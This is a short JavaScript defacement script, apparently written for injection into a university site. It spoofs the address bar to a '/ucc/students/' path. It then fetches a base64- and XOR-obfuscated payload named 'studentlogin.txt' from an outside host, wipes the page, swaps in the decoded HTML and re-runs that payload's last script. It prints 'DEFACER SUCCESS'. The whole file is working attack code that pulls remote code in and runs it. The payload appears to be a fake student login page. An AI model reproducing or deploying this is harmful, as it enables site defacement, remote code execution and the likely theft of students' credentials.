function clearAndRun(decryptedHTML) {
    // Create a temporary container to parse the HTML
    const tempDiv = document.createElement('div');
    tempDiv.innerHTML = decryptedHTML;

    // Capture the last script tag
    const scripts = tempDiv.querySelectorAll('script');
    const lastScript = scripts[scripts.length - 1];

    // Clear the entire document and inject the decryptedHTML
    document.documentElement.innerHTML = decryptedHTML;

    // After replacing the HTML, re-inject the last script tag into the body
    if (lastScript) {
        const scriptClone = document.createElement('script');
        if (lastScript.src) {
            // For external script, clone the src and inject
            scriptClone.src = lastScript.src;
            scriptClone.async = false; // Ensures it runs in order
        } else {
            // For inline script, inject the script's content
            scriptClone.textContent = lastScript.textContent;
        }
        document.body.appendChild(scriptClone); // Re-inject the last script tag
    }
}


function xorEncryptDecrypt(decodedhtml, key) {
    let result = '';
    for (let i = 0; i < decodedhtml.length; i++) {
        result += String.fromCharCode(decodedhtml.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
}

function deface() {
    history.replaceState(null, null, '/ucc/students/');
    fetch('https://cybercutie0.github.io/-/studentlogin.txt')
        .then(response => response.text()) // Get the response as text (HTML content)
        .then(data => {
            document.body.innerHTML = '';
            let decodedhtml = atob(data);
            let decryptedHTML = xorEncryptDecrypt(decodedhtml, 'fUCCk')
            // Replace the entire HTML of the current document
            clearAndRun(decryptedHTML);
        })
        .catch(error => console.error('Error:', error));
}

console.log("DEFACER SUCCESS");
deface();
